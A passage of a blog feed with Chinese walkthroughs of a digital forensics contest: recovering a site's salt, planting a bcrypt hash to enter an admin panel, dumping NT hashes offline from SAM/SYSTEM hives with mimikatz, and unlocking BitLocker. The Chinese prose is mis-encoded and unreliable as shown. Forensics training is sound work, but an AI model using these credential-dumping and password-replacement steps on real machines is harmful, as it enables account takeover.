class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSalt</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;sdahjklhl212jkljass&#x27;</span>;</span><br><span class="line">        <span class="variable">$b</span> = hash(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$a</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="variable">$c</span> = substr(<span class="variable">$b</span>, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">        <span class="variable">$d</span> = base64_decode(<span class="string">&#x27;xPfGJQaE1zE5d+8=&#x27;</span>);</span><br><span class="line">        <span class="variable">$e</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$d</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$e</span> .= chr(ord(<span class="variable">$d</span>[<span class="variable">$i</span>]) ^ ord(<span class="variable">$c</span>[<span class="variable">$i</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$e</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">echo</span> getSalt();<span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(getSalt());</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">KCyFm</span><br><span class="line">lAID2ktDeRlGbcg=</span><br></pre></td></tr></table></figure><p>lAID2ktDeRlGbcg=</p><p>18ã€<br>å‘å¡ç½‘ç«™é…ç½®çš„é‚®ä»¶å‘é€äººåœ°å€æ˜¯ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼š<a href="mailto:&#x61;&#98;&#99;&#64;&#97;&#98;&#x63;&#46;&#99;&#x6f;&#x6d;">&#x61;&#98;&#99;&#64;&#97;&#98;&#x63;&#46;&#99;&#x6f;&#x6d;</a>ï¼‰ï¼ˆ ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆ<br>mysqlé‡Œé¢æ‰¾ä¸åˆ°åœ°å€ï¼Œé‚£ä¹ˆåº”è¯¥åœ¨ redisä¸­ï¼Œ<img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/image-20251117154639754.png" alt="image-20251117154639754"></p><p>æ²¡æœ‰å¯†ç ï¼Œç«¯å£åœ¨31678ï¼Œ<img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/image-20251117154718820.png" alt="image-20251117154718820"></p><p>19ã€<br>å½“å‰å‘å¡ç½‘ç«™é¦–é¡µä»ªè¡¨ç›˜ä¸­æ˜¾ç¤ºçš„å‘å¡ç½‘ç«™ç‰ˆæœ¬ä¸ºï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼š1.1.1ï¼‰ï¼ˆ ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆ<br>ç”±äºåˆšåˆšçœ‹åˆ°æ˜¯åŠ ç›çš„å¯†ç ï¼Œæ‰€ä»¥ç”¨è¿™ä¸ªæ–‡ä»¶è¿›è¡Œç”Ÿæˆä¸€ä¸ªå¯†ç ï¼Œæ•°æ®åº“ä¸­ç»™åˆ°adminï¼ŒçŒœä¸åˆ°å¯†ç ã€‚</p><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/image-20251117161931268.png" alt="image-20251117161931268"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;vendor/autoload.php&#x27;</span>;  <span class="comment">// Composer è‡ªåŠ¨åŠ è½½</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Hashing</span>\<span class="title">BcryptHasher</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$hasher</span> = <span class="keyword">new</span> BcryptHasher();</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"><span class="variable">$hash</span> = <span class="variable">$hasher</span>-&gt;make(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;å¯†ç : <span class="subst">$password</span>\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Bcrypt å“ˆå¸Œ: <span class="subst">$hash</span>\n&quot;</span>;</span><br><span class="line">å¯†ç : <span class="number">123456</span></span><br><span class="line">Bcrypt å“ˆå¸Œ: $<span class="number">2</span>y$<span class="number">10</span><span class="variable">$e</span>/<span class="number">5</span>C5/ks/asVw3AJeOZ0AeJDM7kpIipHJhsfyBiDY1HwiwvyRBDOq</span><br></pre></td></tr></table></figure><p>åŒç›®å½•å³å¯ï¼Œç›´æ¥ç™»å½•<img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/image-20251117162000224.png" alt="image-20251117162000224"></p><p>20ã€<br>å½“å‰å‘å¡ç½‘ç«™ä¸­ç»‘å®šçš„è®¢å•æ¨é€Telegramç”¨æˆ·idä¸ºï¼ˆç­”æ¡ˆæ ¼å¼ï¼šè¯·æŒ‰å®é™…å€¼å¡«å†™ï¼‰ï¼ˆ )<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆï¼Œåå°ï¼Œé‚®ä»¶<br><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81wp/image-20251117162505146.png" alt="image-20251117162505146"></p><h4 id="è‡´è°¢"><a href="#è‡´è°¢" class="headerlink" title="è‡´è°¢"></a>è‡´è°¢</h4><p>æœ€åæ„Ÿè°¢æ‚¨è¯»åˆ°ç°åœ¨ï¼Œè¿™ç¯‡æ–‡ç« åŒ†å¿™æ„æˆè‚¯å®šæœ‰ä¸å‘¨åˆ°æˆ–æè¿°ä¸æ­£ç¡®çš„åœ°æ–¹ï¼ŒæœŸå¾…ä¸šç•Œå¸ˆå‚…ä»¬ç”¨å„ç§æ–¹å¼æŒ‡æ­£å‹˜è¯¯ã€‚å¦‚æœæ‚¨æ„Ÿè§‰æ–‡ç« å†™çš„ä¸é”™ï¼Œç»™å…¬ä¼—å·ç‚¹ç‚¹å…³æ³¨ï¼Œå…ˆè°¢è°¢å¤§å®¶äº†ã€‚</p><h4 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://yagami.vip/archives/2025-nian-shu-zheng-bei-chu-sai-fu-wu-qi-ti-jie-xi</span><br><span class="line">https://mp.weixin.qq.com/s/-MZFKRd9K8rRfvik5BELYQ</span><br><span class="line">https://mp.weixin.qq.com/s/APyP-mcd40kGCn2U1RKrZA</span><br><span class="line">https://mp.weixin.qq.com/s/3krSu81iOGABqk9TNC6Sjw</span><br><span class="line">https://blog.csdn.net/m0_37867238/article/details/154353116</span><br></pre></td></tr></table></figure><blockquote><p>emmm å¤ªèœäº†<br>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬äºŒå±Šâ€œæ•°è¯æ¯â€ç”µå­æ•°æ®å–è¯åˆ†æå¤§èµ›-è®¡ç®—æœºå–è¯wp</title>
      <link href="/2025/11/04/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8F%96%E8%AF%81wp/"/>
      <url>/2025/11/04/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B-%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8F%96%E8%AF%81wp/</url>
      
        <content type="html"><![CDATA[<h4 id="é¢˜"><a href="#é¢˜" class="headerlink" title="é¢˜"></a>é¢˜</h4><p>å¼€å±€ç»™åˆ°ä¸€ä¸ªä»€ä¹ˆåç¼€ä¹Ÿä¸æ˜¯æ–‡ä»¶ï¼Œä¹Ÿæ²¡è¯´ä½¿ç”¨å•¥æ‰“å¼€ï¼Œè¿™é‡Œç®€å•è®²ä¸€ä¸‹ï¼Œæ€ä¹ˆå°†ç¯å¢ƒè¿è¡Œèµ·æ¥ï¼Œåœ¨è¿›è¡Œåšé¢˜ã€‚</p><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251104145746952.png" alt="image-20251104145746952"></p><p>é¦–å…ˆç”¨è¿™veraåŠ è½½ä¸‹è½½åˆ°çš„é•œåƒæ–‡ä»¶ï¼Œå¯†ç å·²ç»ç»™äº†ã€‚</p><p>å®¹å™¨å¯†ç ï¼šGQ7aXryvOC<em>M8qG</em>eXa19K9<em>g&amp;jtHS</em>Gtrimps@Qx<em>aYt4oRwwK</em>HeN0A$#EPv*u</p><p>æ­¤æ—¶å°±ä¼šç»™ç”µè„‘æŒ‚è½½ä¸€ä¸ªç›˜</p><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251104145910890.png" alt="image-20251104145910890"></p><p>è¿™é‡Œå°±ä¼šçœ‹åˆ°ä¸ªä¸ªï¼Œæ–‡ä»¶ï¼Œéšä¾¿æ‰“å¼€ä¸€ä¸ª è¿™é‡Œä¼šçœ‹åˆ°æ‰€æœ‰æ£€æï¼Œè¿™é‡Œå¯ä»¥çœ‹åˆ°</p><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251104173529790.png" alt="image-20251104173529790"></p><p>æ–‡ä»¶éƒ½æ˜¯E01çš„åç¼€ï¼Œç”¨ftkæ£é¼“äº†åŠå¤©ï¼ŒæŒ‚è½½ä¸Šï¼Œvmæ‰“ä¸å¼€ï¼Œæœ€åè¯•äº†ä¸€ä¸‹Arsenal Image Mounterï¼Œæ²¡é—®é¢˜ã€‚<img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251104182556753.png" alt="image-20251104182556753"></p><p>è¿™æ ·æŒ‚è½½åˆ°ç›˜ä¸Šåï¼Œæ–°å»ºä¸€ä¸ªè™šæ‹Ÿæœºï¼Œè¿™é‡Œçœ‹åˆ°</p><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251105095417048.png" alt="image-20251105095417048"></p><p>è¿™ä¸ªæ˜¯æ˜¯ç‰©ç†ç£ç›˜3ï¼Œä¸€ä¼šä¼šç”¨åˆ°</p><p>ç®¡ç†å‘˜æ‰“å¼€vmware ç„¶ååˆ›å»ºä¸€ä¸ªè™šæ‹Ÿæœºï¼Œæœºå™¨ç±»å‹é€‰å¯¹å³å¯ï¼Œç„¶åè¿™ä¸ªç£ç›˜çš„æ—¶å€™ç”¨ç‰©ç†ç£ç›˜ï¼Œ</p><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251105095445190-17623076854861.png" alt="image-20251105095445190"></p><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251105095606264.png" alt="image-20251105095606264"></p><p>é€‰æ‹©ä½ ç‚¹é‚£ä¸ªç›˜å·ï¼Œå…¶ä»–é»˜è®¤å³å¯ã€‚</p><p>å¥½ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥çœ‹åˆ°ç†Ÿæ‚‰çš„ç•Œé¢äº†ï¼Œ</p><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251105100054756.png" alt="image-20251105100054756"></p><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬ä¼šå‘ç°ï¼Œå¹¶æ²¡ç”¨ç»™æˆ‘ä»¬å¯†ç ï¼Œèµ›äº‹æ‰¾äº†ä¸€åœˆï¼Œä¹Ÿæ²¡æœ‰æ‰¾åˆ°å¯†ç ï¼Œç™»ä¸ä¸Šå»çš„è¯ï¼Œåªèƒ½ç”¨å·¥å…·å–è¯äº†ï¼Œæ­¤æ—¶æˆ‘ä»¬å›åˆ°ftkï¼Œftk èƒ½æ‰¾åˆ°ã€‚file-&gt;add evidence item -&gt;image fileé€‰æ‹©ä½ çš„é•œåƒæ–‡ä»¶å³å¯</p><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251105100255885.png" alt="image-20251105100255885"></p><p>ç„¶åç‚¹è¿™ä¸ªå¾ˆå¤šmbçš„æ–‡ä»¶</p><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251105102510219.png" alt="image-20251105102510219"></p><p>å°±å¯ä»¥çœ‹åˆ°æœºå™¨ç›¸å…³ç›®å½•äº†ã€‚æ¥ä¸‹æ¥ï¼Œæ‰¾åˆ°ç½‘ä¸Šæ–‡ç« mimikatzç¦»çº¿å¯¼å‡ºhashï¼Œè·¯å¾„åœ¨C:\Windows\System32\configï¼Œéœ€è¦ä¸¤ä¸ªæ–‡ä»¶ï¼ŒSAM,SYSTEM</p><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251105105519198.png" alt="image-20251105105519198"></p><p>PS D:\tools\Neiwang\mimikatz_trunk\x64&gt; .\mimikatz.exe</p><p>æ–‡ä»¶æ”¾åˆ°mimikatzä¸‹ï¼Œlsadump::sam /sam:sam /system:system</p><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251105105753525.png" alt="image-20251105105753525"></p><p>å³å¯è·å–åˆ°hash</p><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251105105912763.png" alt="image-20251105105912763"></p><p>è®¡ç®—æœºå–è¯åˆ†æ<br>è¯·æ ¹æ®è®¡ç®—æœºæ£€æå’Œå†…å­˜æ£€æï¼Œå›ç­”ä»¥ä¸‹é—®é¢˜ï¼š</p><h5 id="41ã€"><a href="#41ã€" class="headerlink" title="41ã€"></a>41ã€</h5><p>æ“ä½œç³»ç»Ÿçš„Buildç‰ˆæœ¬å·æ˜¯ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼š1ï¼‰ï¼ˆ ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆ<img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251105110627068.png" alt="image-20251105110627068"></p><h5 id="42ã€"><a href="#42ã€" class="headerlink" title="42ã€"></a>42ã€</h5><p>æ“ä½œç³»ç»Ÿè®¾ç½®çš„è´¦æˆ·å¯†ç æœ€é•¿å­˜ç•™æœŸä¸ºå¤šå°‘å¤©ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼š1ï¼‰ï¼ˆ ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆ<br><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251105112107917.png" alt="image-20251105112107917"></p><h5 id="43ã€"><a href="#43ã€" class="headerlink" title="43ã€"></a>43ã€</h5><p>ç”¨æˆ·2ç™»é™†å¯†ç NTå“ˆå¸Œå€¼åå…­ä½æ˜¯ï¼Ÿï¼ˆå­—æ¯å…¨å¤§å†™ï¼Œç­”æ¡ˆæ ¼å¼ï¼šAAAAAAï¼‰ï¼ˆ ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆ<br>mimikatzä¸­å·²è·å–åˆ°ï¼Œ<img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251105112200987.png" alt="image-20251105112200987"></p><h5 id="44ã€"><a href="#44ã€" class="headerlink" title="44ã€"></a>44ã€</h5><p>è“ç‰™macåœ°å€æ˜¯å¤šå°‘ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼šAA-AA-AA-AA-AA-AAï¼‰ï¼ˆ ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¿™é‡Œçœ‹äº†ä¸‹å…¶ä»–åŒå­¦çš„ç­”æ¡ˆéƒ½æ˜¯ä»å–è¯å·¥å…·ä¸­è·å–çš„ï¼Œè¿™é‡Œä¹Ÿå¯ä»¥ä»è®¾å¤‡ç®¡ç†å™¨ä¸­è·å–ã€‚æ‰“å¼€è®¾å¤‡ç®¡ç†å™¨ï¼ŒæŸ¥çœ‹éšè—çš„è®¾å¤‡ï¼Œè½¯ä»¶è®¾å¤‡ä¸­æœ‰ä¸€ä¸ªè“ç‰™ï¼Œå±æ€§æŸ¥çœ‹è®¾å¤‡å®åŠ›è·¯å¾„å°±æ˜¯äº†<br>æœªä¿å­˜<img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251105113710693.png" alt="image-20251105113710693"></p><h5 id="45ã€"><a href="#45ã€" class="headerlink" title="45ã€"></a>45ã€</h5><p>SafeImagerçš„äº§å“åºåˆ—å·åå››ä½æ˜¯ï¼Ÿï¼ˆå­—æ¯å…¨å¤§å†™ï¼Œç­”æ¡ˆæ ¼å¼ï¼šAAAAAAï¼‰ï¼ˆ ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆ<br><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251105114848972.png" alt="image-20251105114848972"></p><h5 id="46ã€"><a href="#46ã€" class="headerlink" title="46ã€"></a>46ã€</h5><p>123.VHDæ‰€å¤„çš„ç»“æŸæ‰‡åŒºæ˜¯ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼š1 ï¼‰ï¼ˆ ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆ<br><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251105115125676.png" alt="image-20251105115125676"></p><h5 id="47ã€"><a href="#47ã€" class="headerlink" title="47ã€"></a>47ã€</h5><p>ç”¨æˆ·åœ¨BitLockeråŠ å¯†åˆ†åŒºæœ€åä¿®æ”¹çš„æ–‡ä»¶æ˜¯?ï¼ˆç­”æ¡ˆæ ¼å¼ï¼šabcd.txtï¼‰ï¼ˆ ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆ<br>è¿™é‡Œéœ€è¦å…ˆè§£bitlocker ï¼Œå¯†ç åœ¨ä¸Šé¢çš„ vhdä¸­ï¼Œç›´æ¥åŒå‡»è¿™ä¸ª,ä¼šæŒ‚è½½ä¸€ä¸ªç›˜ï¼Œ<img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251105154020439.png" alt="image-20251105154020439"></p><p>è¿›åˆ°backupä¸­ï¼Œå¯ä»¥çœ‹åˆ°bitlockeræ¢å¤å¯†é’¥æ–‡ä»¶ï¼Œå¤åˆ¶é‡Œé¢å¯†é’¥ã€‚è¿™é‡Œå…ˆä¸è¦åœ¨è™šæ‹Ÿæœºé‡Œè§£ï¼Œéœ€è¦ç°åœ¨ç‰©ç†æœºè§£ï¼Œä¸ç„¶ä¼šæŠ¥é”™ï¼Œå› ä¸ºæŒ‚è½½ç›˜çš„è½¯ä»¶è¯†åˆ«ä¸äº†ï¼Œ<img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251105154233358.png" alt="image-20251105154233358"></p><p>è§£å¼€åï¼Œå°±å¯ä»¥è®¿é—®ç›˜äº† èµ„æ–™1.txt</p><h5 id="48ã€"><a href="#48ã€" class="headerlink" title="48ã€"></a>48ã€</h5><p>ç”¨æˆ·è¿æ¥192.168.114.129æ—¶ç”¨çš„ä¼šè¯åç§°æ˜¯ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼šæŒ‰ç…§å®é™…æƒ…å†µå¡«å†™ï¼‰ï¼ˆ ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆ<br>åœ¨æˆ‘ä»¬ç™»å½•åˆ°ç”µè„‘ä¸Šçš„æ—¶å€™ä¼šå‘ç°  xshellå’Œfoxmailéƒ½æ˜¯ ç™½è‰²çš„å¿«æ·æ–¹å¼ï¼Œè¯´æ˜åœ¨dç›˜ä¸­ï¼Œdç›˜è¢«åŠ å¯†äº†ï¼Œæ‰€ä»¥è¯»å–ä¸åˆ°æ–‡ä»¶ï¼Œæˆ‘ä»¬è§£å¼€åï¼Œæ‰“å¼€xshellå³å¯å¾—åˆ°è¿æ¥å<img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251105154526940.png" alt="image-20251105154526940"></p><h5 id="49ã€"><a href="#49ã€" class="headerlink" 